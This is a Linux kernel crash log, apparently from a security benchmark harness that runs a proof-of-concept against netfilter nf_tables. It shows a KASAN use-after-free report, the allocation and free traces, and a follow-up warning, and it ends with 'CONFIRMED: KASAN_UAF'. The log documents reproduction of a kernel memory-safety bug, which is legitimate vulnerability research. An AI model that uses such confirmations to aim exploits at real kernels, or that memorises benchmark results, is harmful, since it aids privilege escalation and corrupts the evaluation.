[    4.479274]  ? sock_sendmsg+0x13d/0x180
[    4.480033]  ? __sys_sendto+0x1eb/0x2b0
[    4.480744]  ? __x64_sys_sendto+0xdb/0x1b0
[    4.481559]  ? do_syscall_64+0x3b/0x90
[    4.482176]  netlink_rcv_skb+0x12f/0x370
[    4.483219]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    4.483883]  ? cred_has_capability.isra.0+0x13a/0x230
[    4.484680]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    4.485341]  ? __pfx_cred_has_capability.isra.0+0x10/0x10
[    4.486165]  ? security_capable+0x6c/0xb0
[    4.486827]  nfnetlink_rcv+0x14b/0x360
[    4.487460]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    4.488190]  ? kmalloc_reserve+0x110/0x1e0
[    4.488819]  netlink_unicast+0x588/0x7f0
[    4.489417]  ? __pfx_netlink_unicast+0x10/0x10
[    4.490134]  netlink_sendmsg+0x7b7/0xc60
[    4.490821]  ? __pfx_netlink_sendmsg+0x10/0x10
[    4.491485]  ? __pfx_netlink_sendmsg+0x10/0x10
[    4.492178]  sock_sendmsg+0x13d/0x180
[    4.492694]  __sys_sendto+0x1eb/0x2b0
[    4.493268]  ? __pfx___sys_sendto+0x10/0x10
[    4.493879]  ? _raw_spin_lock_irq+0x81/0xe0
[    4.494539]  ? __rseq_handle_notify_resume+0x7ce/0xc20
[    4.495343]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    4.496076]  ? ksys_write+0xf9/0x1d0
[    4.497128]  __x64_sys_sendto+0xdb/0x1b0
[    4.498348]  ? exit_to_user_mode_prepare+0x2a/0x110
[    4.499214]  ? syscall_exit_to_user_mode+0x21/0x50
[    4.500081]  do_syscall_64+0x3b/0x90
[    4.501429]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    4.502238] RIP: 0033:0x44c323
[    4.502647] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 41 2c 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    4.505126] RSP: 002b:00007ffc49c2e508 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    4.505930] RAX: ffffffffffffffda RBX: 0000000001e7a040 RCX: 000000000044c323
[    4.506787] RDX: 000000000000001c RSI: 0000000001e686f0 RDI: 0000000000000003
[    4.507720] RBP: 00007ffc49c2e510 R08: 000000000048c8c8 R09: 000000000000000c
[    4.508732] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000001e686f0
[    4.509718] R13: 0000000001e686d0 R14: 0000000001e686f0 R15: 000000000048b03a
[    4.510746]  </TASK>
[    4.511107] 
[    4.511295] Allocated by task 61:
[    4.511799]  kasan_save_stack+0x33/0x60
[    4.512364]  kasan_set_track+0x25/0x30
[    4.513006]  __kasan_kmalloc+0x8f/0xa0
[    4.513531]  nf_tables_addchain.constprop.0+0x8d1/0x2200
[    4.514624]  nf_tables_newchain+0x1692/0x2610
[    4.515373]  nfnetlink_rcv_batch+0x129a/0x1fc0
[    4.516170]  nfnetlink_rcv+0x2df/0x360
[    4.516894]  netlink_unicast+0x588/0x7f0
[    4.517443]  netlink_sendmsg+0x7b7/0xc60
[    4.518195]  sock_sendmsg+0x13d/0x180
[    4.518654]  __sys_sendto+0x1eb/0x2b0
[    4.519321]  __x64_sys_sendto+0xdb/0x1b0
[    4.519897]  do_syscall_64+0x3b/0x90
[    4.520508]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    4.521631] 
[    4.521889] Freed by task 47:
[    4.522366]  kasan_save_stack+0x33/0x60
[    4.523463]  kasan_set_track+0x25/0x30
[    4.524123]  kasan_save_free_info+0x2b/0x50
[    4.524837]  __kasan_slab_free+0x10a/0x180
[    4.525355]  __kmem_cache_free+0x82/0x1c0
[    4.526172]  nf_tables_trans_destroy_work+0x852/0xb10
[    4.526924]  process_one_work+0x801/0x1500
[    4.527479]  worker_thread+0xed/0x1390
[    4.528007]  kthread+0x29b/0x370
[    4.528527]  ret_from_fork+0x29/0x50
[    4.529079] 
[    4.529329] The buggy address belongs to the object at ffff888103cabf00
[    4.529329]  which belongs to the cache kmalloc-128 of size 128
[    4.530997] The buggy address is located 88 bytes inside of
[    4.530997]  freed 128-byte region [ffff888103cabf00, ffff888103cabf80)
[    4.532660] 
[    4.532911] The buggy address belongs to the physical page:
[    4.533735] page:00000000edf4dabe refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x103cab
[    4.535254] flags: 0x200000000000200(slab|node=0|zone=2)
[    4.536112] page_type: 0xffffffff()
[    4.536837] raw: 0200000000000200 ffff8881000418c0 dead000000000122 0000000000000000
[    4.538181] raw: 0000000000000000 0000000000100010 00000001ffffffff 0000000000000000
[    4.539455] page dumped because: kasan: bad access detected
[    4.540410] 
[    4.540716] Memory state around the buggy address:
[    4.541761]  ffff888103cabe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc
[    4.542858]  ffff888103cabe80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    4.544259] >ffff888103cabf00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    4.545299]                                                     ^
[    4.546119]  ffff888103cabf80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    4.547164]  ffff888103cac000: 00 fc fc fc fc 00 fc fc fc fc 03 fc fc fc fc 03
[    4.548234] ==================================================================
[    4.549333] Disabling lock debugging due to kernel taint
[+] poc finished
[    4.551702] poc (61) used greatest stack depth: 24776 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    4.582817] ------------[ cut here ]------------
[    4.583551] WARNING: CPU: 0 PID: 26 at net/netfilter/nf_tables_api.c:2037 nf_tables_chain_destroy+0x3da/0x510
[    4.585091] Modules linked in:
[    4.585565] CPU: 0 PID: 26 Comm: kworker/u4:1 Tainted: G    B              6.4.0-04322-gc451410ca7e3-dirty #1
[    4.586957] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    4.588219] Workqueue: netns cleanup_net
[    4.588821] RIP: 0010:nf_tables_chain_destroy+0x3da/0x510
[    4.589667] Code: 68 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 22 01 00 00 48 8b 7d 68 e8 6b f1 1f fe 48 89 ef eb 98 <0f> 0b 48 83 c4 10 5b 5d 41 5c 41 5d 41 5e 41 5f c3 cc cc cc cc 0f
[    4.596842] RSP: 0018:ffffc900001c7b00 EFLAGS: 00010286
[    4.597583] RAX: 00000000ffffffff RBX: ffffc900001c7bd0 RCX: 0000000000000001
[    4.599773] RDX: 1ffff110207957ca RSI: 0000000000000004 RDI: ffff888103cabe50
[    4.601365] RBP: ffff888103cabe00 R08: 0000000000000000 R09: ffffed10207f8292
[    4.602397] R10: ffff888103fc1497 R11: 000000000000003e R12: ffff888103fc1498
[    4.603400] R13: dffffc0000000000 R14: ffff888103c26e50 R15: ffffc900001c7bd0
[    4.604410] FS:  0000000000000000(0000) GS:ffff88811b200000(0000) knlGS:0000000000000000
[    4.605693] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.606514] CR2: 0000000000579304 CR3: 0000000103cb8000 CR4: 0000000000350ef0
[    4.607599] Call Trace:
[    4.608022]  <TASK>
[    4.608374]  ? __warn+0xc8/0x250
[    4.608919]  ? nf_tables_chain_destroy+0x3da/0x510
[    4.609649]  ? report_bug+0x26b/0x2e0
[    4.610142]  ? handle_bug+0x3c/0x70
[    4.610714]  ? exc_invalid_op+0x17/0x40
[    4.611394]  ? asm_exc_invalid_op+0x1a/0x20
[    4.612795]  ? nf_tables_chain_destroy+0x3da/0x510
[    4.613957]  __nft_release_table+0x915/0xd60
[    4.615242]  ? __pfx___nft_release_table+0x10/0x10
[    4.616598]  ? __pfx_mutex_lock+0x10/0x10
[    4.617837]  nf_tables_exit_net+0x21f/0x470
[    4.618661]  ops_exit_list+0x89/0x140
[    4.619605]  cleanup_net+0x3b3/0x980
[    4.620428]  ? __pfx_cleanup_net+0x10/0x10
[    4.621232]  ? _raw_spin_lock_irq+0x81/0xe0
[    4.622053]  ? read_word_at_a_time+0xe/0x20
[    4.622716]  ? strscpy+0xad/0x290
[    4.623182]  process_one_work+0x801/0x1500
[    4.623857]  worker_thread+0xed/0x1390
[    4.624403]  ? __pfx_worker_thread+0x10/0x10
[    4.625063]  kthread+0x29b/0x370
[    4.625616]  ? __pfx_kthread+0x10/0x10
[    4.626214]  ret_from_fork+0x29/0x50
[    4.626863]  </TASK>
[    4.627325] ---[ end trace 0000000000000000 ]---
[    4.762509] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    5.956249] ACPI: PM: Preparing to enter system sleep state S5
[    5.959671] reboot: Power down
CONFIRMED: KASAN_UAF
